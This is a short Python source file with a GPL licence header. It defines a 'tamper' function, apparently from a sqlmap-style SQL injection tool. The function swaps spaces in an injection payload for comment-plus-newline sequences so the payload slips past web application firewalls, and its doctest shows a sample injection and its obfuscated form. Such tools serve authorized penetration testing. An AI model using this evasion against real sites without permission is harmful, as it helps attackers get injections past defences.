"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

import random
import string



def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')

    Requirement:
        * MSSQL
        * SQLite

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ZeroNights SQL injection challenge,
          https://proton.onsec.ru/contest/

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'
    """

    retVal = ""

    if payload:
        for i in range(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(random.randint(6, 12)))
                retVal += "--%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal